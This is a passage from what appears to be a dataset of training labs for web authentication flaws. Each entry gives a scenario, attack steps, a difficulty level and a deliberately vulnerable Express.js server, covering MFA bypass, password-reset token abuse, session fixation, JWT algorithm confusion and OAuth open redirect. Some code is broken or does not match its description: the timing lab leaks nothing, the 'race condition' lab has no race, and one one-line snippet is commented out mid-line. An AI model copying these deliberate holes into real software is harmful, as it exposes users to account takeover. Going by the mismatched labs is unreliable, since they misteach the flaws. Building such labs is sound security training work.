  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nconst users = [{ username: 'admin', password: 'adminpass' }];\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required />\n            <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Vulnerable login route\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    \n    // Vulnerability: If multiple password parameters are provided, the server may not validate correctly\n    if (user && (Array.isArray(password) || password === user.password)) {\n        res.send(`Welcome, ${username}! (Authenticated via HTTP Parameter Pollution)`);\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`HTTP Parameter Pollution Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypassing multi-factor Autnenticationusing a race condition",
  "Lab Description": "This lab demonstrates an Autnenticationbypass caused by a race condition in the multi-factor Autnentication(MFA) process. The application allows users to log in with a username and password and then requests a one-time code (OTP). However, due to an implementation flaw, the system does not properly validate session states when OTP requests are sent in parallel. An attacker can exploit this race condition to bypass MFA by submitting concurrent requests, allowing them to gain unauthorized access without providing the correct OTP. To solve the lab, exploit this issue to log in as the admin user without a valid OTP.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(session({\n    secret: 'supersecretkey',\n    resave: false,\n    saveUninitialized: true\n}));\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'admin', password: 'password123', otp: null }];\n\n// Step 1: Login with username & password\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username && u.password === password);\n    if (user) {\n        req.session.user = username;\n        user.otp = crypto.randomInt(100000, 999999).toString(); // Generate OTP\n        res.send('OTP required. Submit to /verify with the correct code.');\n    } else {\n        res.status(401).send('Invalid credentials.');\n    }\n});\n\n// Step 2: Verify OTP (Vulnerable to race condition)\napp.post('/verify', (req, res) => {\n    const user = users.find(u => u.username === req.session.user);\n    if (!user) return res.status(401).send('Unauthorized');\n    \n    const { otp } = req.body;\n    if (otp === user.otp) {\n        req.session.authenticated = true;\n        res.send('Login successful!');\n    } else {\n        res.status(401).send('Invalid OTP');\n    }\n});\n\n// Step 3: Access the account (should be protected by MFA)\napp.get('/account', (req, res) => {\n    if (req.session.authenticated) {\n        res.send(`Welcome to your account, ${req.session.user}!`);\n    } else {\n        res.status(403).send('Access denied.');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`MFA Race Condition Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Timing attack on naive password comparison",
  "Lab Description": "This lab demonstrates a timing attack vulnerability in the login functionality. The application compares the submitted password to the stored password using a naive, character-by-character comparison that introduces a fixed delay for each matching character. An attacker can exploit this predictable delay to infer the correct password one character at a time. To solve the lab, perform a timing attack to recover the target user's password and gain access to the account.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated user database with one user\nconst users = [\n    { username: 'victim', password: 's3cr3t' }\n];\n\n// Naive slow compare function that introduces a fixed delay for each matching character\nfunction slowCompare(a, b) {\n    if (a.length !== b.length) {\n        return false;\n    }\n    let result = true;\n    for (let i = 0; i < a.length; i++) {\n        // Introduce a 50ms delay for each character comparison\n        const start = Date.now();\n        while (Date.now() - start < 50) {}\n        if (a[i] !== b[i]) {\n            result = false;\n        }\n    }\n    return result;\n}\n\n// Home/Login route\napp.get('/', (req, res) => {\n    res.send(`\n        <h2>Login</h2>\n        <form method=\"POST\" action=\"/login\">\n            <input type=\"text\" name=\"username\" placeholder=\"Username\" required /><br>\n            <input type=\"text\" name=\"password\" placeholder=\"Password\" required /><br>\n            <button type=\"submit\">Login</button>\n        </form>\n    `);\n});\n\n// Login route that uses the slowCompare function\napp.post('/login', (req, res) => {\n    const { username, password } = req.body;\n    const user = users.find(u => u.username === username);\n    if (!user) return res.status(401).send('Invalid credentials');\n    if (slowCompare(user.password, password)) {\n        res.send(`Welcome, ${username}!`);\n    } else {\n        res.status(401).send('Invalid credentials');\n    }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Timing Attack Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Password reset token reuse vulnerability",
  "Lab Description": "This lab demonstrates an Autnenticationvulnerability in the password reset process. The application generates a password reset token and sends it to the user's email, but fails to invalidate the token after a successful password reset. This allows an attacker to reuse an old token to reset the password of another user and gain unauthorized access. To solve the lab, reuse the previously generated token to change the target user's password and log in with the new credentials.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Sample user database\nlet users = [\n  { username: 'carlos', password: 'oldpassword', email: 'carlos@example.com' }\n];\n\n// Insecure storage for password reset tokens (tokens are not invalidated after use)\nlet resetTokens = {};\n\n// Endpoint to request a password reset\napp.post('/request-reset', (req, res) => {\n  const { email } = req.body;\n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(400).send('User not found');\n  \n  // Generate an insecure and predictable token for demonstration purposes\n  const token = crypto.createHash('sha256').update(email).digest('hex').slice(0, 8);\n  resetTokens[token] = user.username;  // Token is stored but never invalidated\n  res.send(`Password reset token: ${token}`);\n});\n\n// Endpoint to reset the password\napp.post('/reset-password', (req, res) => {\n  const { token, newPassword } = req.body;\n  const username = resetTokens[token];\n  if (!username) return res.status(400).send('Invalid or expired token');\n  \n  const user = users.find(u => u.username === username);\n  if (!user) return res.status(400).send('User not found');\n\n  // Update the user's password\n  user.password = newPassword;\n  // Note: The token is not deleted after use, enabling token reuse\n  res.send('Password has been reset successfully');\n});\n\n// Login endpoint\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "AutnenticationBypass via Weak Password Reset Validation",
  "Lab Description": "This lab's Autnenticationsystem has a flawed password reset mechanism. The application does not properly validate ownership of the password reset token, allowing attackers to hijack the reset process for other users. To solve the lab, exploit this vulnerability to reset Carlos's password and log into his account. Steps: 1. Request a password reset token for your own account. 2. Intercept the token submission request and replace your email with Carlos's email address while keeping the valid token. 3. Set a new password for Carlos's account. 4. Authenticate as Carlos using the new password.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [\n  { email: 'carlos@example.com', password: 'defaultPass' },\n  { email: 'attacker@example.com', password: 'hackMe' }\n];\n\nconst validTokens = new Map();\n\napp.post('/forgot-password', (req, res) => {\n  const { email } = req.body;\n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(404).send('User not found');\n  \n  const token = Math.random().toString(36).slice(2, 10);\n  validTokens.set(email, token);\n  res.send(`Password reset token sent to ${email}: ${token}`);\n});\n\n// VULNERABLE ENDPOINT: Token is validated without checking email-token binding\napp.post('/reset-password', (req, res) => {\n  const { email, token, newPassword } = req.body;\n  \n  // Flaw: Only checks if token exists, not which user it belongs to\n  if (![...validTokens.values()].includes(token)) {\n    return res.status(401).send('Invalid token');\n  }\n  \n  const user = users.find(u => u.email === email);\n  if (!user) return res.status(404).send('User not found');\n  \n  user.password = newPassword;\n  validTokens.delete(email);\n  res.send('Password successfully reset');\n});\n\napp.post('/login', (req, res) => {\n  const { email, password } = req.body;\n  const user = users.find(u => u.email === email && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  res.send(`Logged in as ${email}`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Auth Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Credential Stuffing Attack",
  "Lab Description": "This lab is vulnerable to credential stuffing attacks. The login system does not properly rate-limit failed login attempts, allowing an attacker to repeatedly try different username and password combinations. To solve the lab, successfully log in to the admin account using a brute-force attack.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'admin', password: 'admin123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.send('Welcome, ' + username + '!'); }); const PORT = 4000; app.listen(PORT, () => console.log('Credential Stuffing Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit a weak password reset mechanism to access Carlos's account.",
  "Lab Description": "The application has a password reset feature that generates a reset token identical to the username provided in the request. This allows an attacker to reset any user's password by simply using their username as the token. To solve the lab, request a password reset for the user 'attacker' to observe the token, then use 'carlos' as the token to reset Carlos's password, and log in to his account with the new password.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'weak_secret', resave: false, saveUninitialized: true }));\nlet users = { 'attacker': { password: 'attacker_pass' }, 'carlos': { password: 'carlos_pass' } };\napp.get('/login', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    req.session.username = username;\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/reset', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><button type=\"submit\">Request reset</button></form>'));\napp.post('/reset', (req, res) => {\n  const { username } = req.body;\n  if (users[username]) {\n    const token = username;\n    res.send(`A reset link has been sent: <a href=\"/reset-password?token=${token}\">Reset password</a>`);\n  } else {\n    res.status(404).send('User not found');\n  }\n});\napp.get('/reset-password', (req, res) => {\n  const { token } = req.query;\n  if (!token) return res.status(400).send('Token required');\n  res.send(`<form method=\"post\"><input name=\"token\" type=\"hidden\" value=\"${token}\"><input name=\"new_password\" type=\"password\"><button type=\"submit\">Reset password</button></form>`);\n});\napp.post('/reset-password', (req, res) => {\n  const { token, new_password } = req.body;\n  if (users[token]) {\n    users[token].password = new_password;\n    res.send(`Password for ${token} has been reset.`);\n  } else {\n    res.status(400).send('Invalid token');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`Insecure Password Reset Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Session Fixation Attack to Compromise Administrative Access",
  "Lab Description": "This lab contains an Autnenticationvulnerability where the application does not regenerate session IDs after login, allowing session fixation. An attacker can force a user to authenticate with a known session ID and hijack their session. To solve the lab: 1. Obtain a valid session ID before authentication. 2. Trick Carlos (admin) into logging in with your pre-set session ID (simulated via CSRF/forced browsing). 3. Use the session ID to access the admin dashboard and delete all user data. The lab is solved when you execute the /admin/wipe endpoint as Carlos.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.json());\napp.use(cookieParser());\n\nconst sessions = new Map();\nconst users = [\n  { username: 'carlos', password: 's3cr3tAdm1n!', role: 'admin' },\n  { username: 'attacker', password: 'p@ssw0rd', role: 'user' }\n];\n\n// Generate initial session for demonstration\nconst initialSession = Math.random().toString(36).slice(2, 18);\nsessions.set(initialSession, { authenticated: false });\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  \n  if (!user) return res.status(401).send('Invalid credentials');\n  \n  // VULNERABILITY: Uses existing session ID if provided via cookie\n  const sessionId = req.cookies.sessionId || Math.random().toString(36).slice(2, 18);\n  \n  sessions.set(sessionId, {\n    authenticated: true,\n    username: user.username,\n    role: user.role\n  });\n  \n  res.cookie('sessionId', sessionId, { httpOnly: true });\n  res.send('Logged in successfully');\n});\n\napp.get('/admin/wipe', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const session = sessions.get(sessionId);\n  \n  if (!session?.authenticated || session.role !== 'admin') {\n    return res.status(403).send('Admin access required');\n  }\n  \n  // Lab solution trigger\n  res.send('All data wiped by ' + session.username);\n});\n\napp.get('/profile', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  const session = sessions.get(sessionId);\n  \n  if (!session?.authenticated) {\n    return res.status(401).send('Not authenticated');\n  }\n  \n  res.send(`Welcome ${session.username} (${session.role})`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`hard Auth Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Exploit a lack of session timeout to access Alice's account after she logs out.",
  "Lab Description": "The application does not invalidate session IDs after a user logs out or after a period of inactivity, allowing an attacker to reuse an old session ID to access a user's account. To solve the lab, capture Alice's session ID after she logs in, wait for her to log out, then use the same session ID to access her account page.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(session({ secret: 'simple_secret', resave: false, saveUninitialized: true }));\nconst users = { 'alice': 'alice_pass', 'attacker': 'attacker_pass' };\napp.get('/login', (req, res) => res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><button type=\"submit\">Login</button></form>'));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.username = username;\n    res.send('Logged in! <a href=\"/account\">Account</a> <a href=\"/logout\">Logout</a>');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.username = null;\n  res.send('Logged out');\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send(`Welcome, ${req.session.username}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\nconst PORT = 5000;\napp.listen(PORT, () => console.log(`Insecure Session Expiration Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Bypass Multi-Factor Autnenticationvia Brute-Forceable TOTP",
  "Lab Description": "This lab implements weak Time-Based One-Time Password (TOTP) validation for multi-factor authentication. While the attacker has obtained Carlos's password, the MFA protection can be bypassed due to missing rate-limiting and code reuse prevention. To solve the lab: 1. Authenticate with Carlos's credentials (username: 'carlos', password: 'admin123'). 2. Brute-force the 6-digit TOTP code within 2 minutes of code validity. 3. Access the administrative panel at /admin to delete all records.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst speakeasy = require('speakeasy');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{\n  username: 'carlos',\n  password: 'admin123',\n  mfaSecret: speakeasy.generateSecret({ length: 20 }).base32,\n  isAdmin: true\n}];\n\nconst activeSessions = new Map();\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  \n  if (!user) return res.status(401).send('Invalid credentials');\n  \n  // Return MFA requirement but expose vulnerability trigger\n  res.status(202).json({\n    message: 'MFA required',\n    remainingAttempts: 'unlimited' // Critical flaw: No attempt counter\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const { username, code } = req.body;\n  const user = users.find(u => u.username === username);\n  \n  // VULNERABILITY: No rate-limiting + accepts old codes within 120s window\n  const verified = speakeasy.totp.verify({\n    secret: user.mfaSecret,\n    encoding: 'base32',\n    token: code,\n    window: 4 // Allows codes from 2 minutes before/after\n  });\n\n  if (!verified) return res.status(401).send('Invalid MFA code');\n\n  // Critical flaw: Doesn't invalidate used codes\n  const sessionToken = Buffer.from(username + Date.now()).toString('base64');\n  activeSessions.set(sessionToken, user);\n  res.json({ token: sessionToken });\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const session = activeSessions.get(token);\n  \n  if (!session?.isAdmin) return res.status(403).send('Admin access required');\n  res.send('Admin panel: <button onclick=\"fetch('/admin/wipe')\">WIPE DATA</button>');\n});\n\napp.post('/admin/wipe', (req, res) => {\n  // Lab solution validation\n  res.send('All critical data deleted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`MFA Bypass Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Parameter Tampering Privilege Escalation",
  "Lab Description": "This lab is vulnerable to privilege escalation through parameter tampering. The application uses a 'role' parameter passed in the login request to determine user permissions. The backend blindly trusts this parameter, allowing an attacker to escalate their privileges to admin. To solve the lab, exploit the 'role' parameter in the login request.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'user', password: 'password' }]; app.post('/login', (req, res) => { const { username, password, role } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); // Vulnerability: No validation or sanitization of the 'role' parameter if (role === 'admin') { res.send('Welcome, Admin! You can perform sensitive actions here.'); } else { res.send('Welcome, ' + username + '!'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Parameter Tampering Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Log into the system by exploiting unchanged default credentials.",
  "Lab Description": "The application is a simple web server with a login page. It was deployed with default credentials that were never changed: username 'admin' and password 'admin'. Your task is to log into the system using these default credentials. Once logged in, you will see a 'Welcome, admin!' message, indicating success.",
  "Vulnerability name": "Autnentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Default credentials\nconst users = { 'admin': 'admin' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send(\"<form method='post'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Login</button></form>\");\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'admin') {\n    res.send('Welcome, admin!');\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 7000;\napp.listen(PORT, () => console.log(`Insecure Default Credentials Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "JWT Algorithm Confusion to Gain Administrative Privileges",
  "Lab Description": "This lab uses JSON Web Tokens (JWT) for Autnenticationbut fails to validate the signing algorithm properly. The server exposes its public key, enabling attackers to exploit algorithm confusion. To solve the lab: 1. Obtain the server's public key from the exposed JWKS endpoint. 2. Forge an admin JWT by switching the algorithm from RS256 to HS256. 3. Access the /admin/export endpoint to download sensitive data. You start with valid low-privilege credentials (user: attacker, password: p@ssw0rd).",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\napp.use(bodyParser.json());\n\n// Server's key pair\nconst privateKey = `-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC+8Zbn3NROZ/9L\n...[truncated]...\n3ZtC4x7SJ0miwIDAQAB\n-----END PRIVATE KEY-----`;\nconst publicKey = `-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvvGW59zUTmf/S0b4tAxs\n...[truncated]...\nNG0LjHtInSaLAgMBAAE=\n-----END PUBLIC KEY-----`;\n\nconst users = [\n  { username: 'attacker', password: 'p@ssw0rd', role: 'user' },\n  { username: 'carlos', password: 's3cr3t!', role: 'admin' }\n];\n\n// Vulnerable JWKS endpoint\ntapp.get('/.well-known/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      kid: '1',\n      use: 'sig',\n      n: 'vrGW59zUTmf_S0b4tAxs...',\n      e: 'AQAB'\n    }]\n  });\n});\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n\n  // Generate JWT with vulnerable configuration\n  const token = jwt.sign(\n    { user: username, role: user.role },\n    privateKey,\n    { algorithm: 'RS256', expiresIn: '1h' }\n  );\n  res.json({ token });\n});\n\n// Vulnerable JWT verification middleware\nconst verifyToken = (req, res, next) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  if (!token) return res.status(401).send('Unauthorized');\n\n  // Critical flaw: No algorithm enforcement\n  jwt.verify(token, (header, callback) => {\n    jwksClient.getSigningKey(header.kid, (err, key) => {\n      callback(err, key?.publicKey || publicKey);\n    });\n  }, { algorithms: ['RS256', 'HS256'] }, (err, decoded) => {\n    if (err) return res.status(401).send('Invalid token');\n    req.user = decoded;\n    next();\n  });\n};\n\napp.get('/admin/export', verifyToken, (req, res) => {\n  if (req.user.role !== 'admin') return res.status(403).send('Admin required');\n  res.send('SECRET DATA: Credit card records of all users');\n});\n\napp.get('/profile', verifyToken, (req, res) => {\n  res.send(`Logged in as ${req.user.user} (${req.user.role})`);\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`JWT Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Predictable AutnenticationTokens",
  "Lab Description": "This lab uses predictable Autnenticationtokens in URLs. The tokens follow a simple pattern (e.g., 'user1-token', 'user2-token'), allowing an attacker to guess other users' tokens. To solve the lab, access another user's profile by modifying the token in the URL.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = { 'user1': { token: 'user1-token', data: 'User 1 data' }, 'user2': { token: 'user2-token', data: 'User 2 data' } }; app.get('/profile', (req, res) => { const token = req.query.token; const user = Object.keys(users).find(u => users[u].token === token); if (!user) return res.status(401).send('Unauthorized'); res.send('Welcome, ' + user + '! Data: ' + users[user].data); }); const PORT = 4000; app.listen(PORT, () => console.log('Predictable Token Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit an insecure 'Remember Me' feature to access the admin account.",
  "Lab Description": "The application has a 'Remember Me' feature that stores the username in a cookie. When this cookie is present, the application automatically logs in the user as that username without further verification. To solve the lab, set the 'remember_user' cookie to 'admin' and visit the login page to be automatically logged in as admin, then access the account page to confirm.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst session = require('express-session');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.use(cookieParser());\napp.use(session({ secret: 'simple_secret', resave: false, saveUninitialized: true }));\nconst users = { 'user': 'pass', 'admin': 'adminpass' };\napp.get('/login', (req, res) => {\n  if (req.cookies.remember_user && users[req.cookies.remember_user]) {\n    req.session.user = req.cookies.remember_user;\n    res.redirect('/account');\n  } else {\n    res.send('<form method=\"post\"><input name=\"username\"><input name=\"password\" type=\"password\"><input type=\"checkbox\" name=\"rememberMe\"> Remember Me<button type=\"submit\">Login</button></form>');\n  }\n});\napp.post('/login', (req, res) => {\n  const { username, password, rememberMe } = req.body;\n  if (users[username] && users[username] === password) {\n    req.session.user = username;\n    if (rememberMe) {\n      res.cookie('remember_user', username, { maxAge: 30 * 24 * 60 * 60 * 1000 });\n    }\n    res.redirect('/account');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome, ${req.session.user}!`);\n  } else {\n    res.status(401).send('Please log in');\n  }\n});\napp.get('/logout', (req, res) => {\n  req.session.destroy();\n  res.clearCookie('remember_user');\n  res.send('Logged out');\n});\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Insecure Remember Me Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "OAuth Token Hijacking via Open Redirect and Missing State Parameter Validation",
  "Lab Description": "This lab contains a vulnerable OAuth 2.0 implementation where attackers can steal authorization codes through an open redirect vulnerability and gain full account access. The system fails to validate the 'state' parameter and allows arbitrary redirect URIs. To solve the lab: 1. Exploit the open redirect in /redirect endpoint to capture Carlos's authorization code. 2. Exchange the stolen code for an access token. 3. Use the token to access Carlos's private notes at /notes and delete the critical document. You start with a phishing page at http://attacker.com/callback.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst app = express();\napp.use(bodyParser.json());\n\n// OAuth server configuration\nconst clients = [{\n  client_id: 'vulnerable-app',\n  client_secret: 's3cr3t',\n  redirect_uris: ['http://localhost:4000/callback']\n}];\n\nconst users = [{\n  id: 'carlos',\n  password: 'Winter2023!',\n  notes: ['SECRET: Nuclear launch codes = 000000']\n}];\n\nlet authCodes = new Map();\nlet accessTokens = new Map();\n\n// Vulnerable open redirect endpoint\napp.get('/redirect', (req, res) => {\n  const { url } = req.query;\n  res.redirect(decodeURIComponent(url)); // No validation of redirect targets\n});\n\n// OAuth authorization endpoint\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  const client = clients.find(c => c.client_id === client_id);\n  \n  // Critical flaw: No redirect_uri validation\n  if (!client) return res.status(400).send('Invalid client');\n  \n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes.set(code, { user: 'carlos', client_id });\n  \n  // Vulnerability: State parameter not validated/echoed\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\n// OAuth token endpoint\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  const client = clients.find(c => c.client_id === client_id);\n  \n  if (!client || client.client_secret !== client_secret) {\n    return res.status(401).send('Invalid client credentials');\n  }\n  \n  if (!authCodes.has(code)) return res.status(400).send('Invalid code');\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens.set(token, authCodes.get(code));\n  authCodes.delete(code);\n  \n  res.json({ access_token: token, token_type: 'Bearer' });\n});\n\n// Protected resource\napp.get('/notes', (req, res) => {\n  const authHeader = req.headers.authorization;\n  const token = authHeader?.split(' ')[1];\n  const session = accessTokens.get(token);\n  \n  if (!session) return res.status(401).send('Invalid token');\n  \n  const user = users.find(u => u.id === session.user);\n  res.json(user.notes);\n});\n\napp.delete('/notes', (req, res) => {\n  // Lab solution validation endpoint\n  res.send('Critical documents deleted - Lab solved');\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "Horizontal Privilege Escalation via User ID Manipulation",
  "Lab Description": "This lab allows users to access other users' profiles by manipulating the user ID parameter in the URL. The application does not validate whether the authenticated user is authorized to access the requested profile. To solve the lab, access another user's profile by modifying the user ID in the profile URL.",
  "Vulnerability name": "Authentication",
  "lab level": "medium",
  "src code": "const express = require('express'); const app = express(); const users = { 1: { id: 1, name: 'Alice', email: 'alice@example.com' }, 2: { id: 2, name: 'Bob', email: 'bob@example.com' } }; app.get('/profile/:userId', (req, res) => { const userId = parseInt(req.params.userId); const user = users[userId]; if (!user) return res.status(404).send('User not found'); res.json(user); }); const PORT = 4000; app.listen(PORT, () => console.log('Horizontal Privilege Escalation Lab running on http://localhost:' + PORT));"
},
{
  "Lab scenario": "Exploit a weak password policy to guess a user's password.",
  "Lab Description": "The application enforces a weak password policy that allows very short and simple passwords (e.g., minimum 3 characters, no complexity requirements). Your task is to guess the password for the user 'user1' and log into their account. Hint: The password is a common three-letter word.",
  "Vulnerability name": "Authentication",
  "lab level": "easy",
  "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// Simulated database with user credentials\nconst users = { 'user1': 'cat', 'admin': 'dog' };\n\n// Serve the login page\napp.get('/login', (req, res) => {\n  res.send('<form method=\"post\"><input name=\"username\" placeholder=\"Username\"><input name=\"password\" type=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>');\n});\n\n// Handle login attempts\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username] === password) {\n    res.send(`Welcome, ${username}!`);\n  } else {\n    res.status(401).send('Login failed');\n  }\n});\n\nconst PORT = 8000;\napp.listen(PORT, () => console.log(`Weak Password Policy Lab running on http://localhost:${PORT}`));"
},
{
  "Lab scenario": "SAML AutnenticationBypass via XML Comment Injection and Signature Wrapping",
  "Lab Description": "This lab implements a vulnerable SAML-based SSO system that improperly validates XML signatures and allows comment injection in assertions. Attackers can manipulate SAML responses to impersonate administrators. To solve the lab: 1. Capture a valid SAML response during login. 2. Inject XML comments to alter the NameID and attributes while preserving the valid signature. 3. Bypass signature validation to access the /internal/dashboard as an administrator and execute the system shutdown command.",
  "Vulnerability name": "Authentication",
  "lab level": "hard",
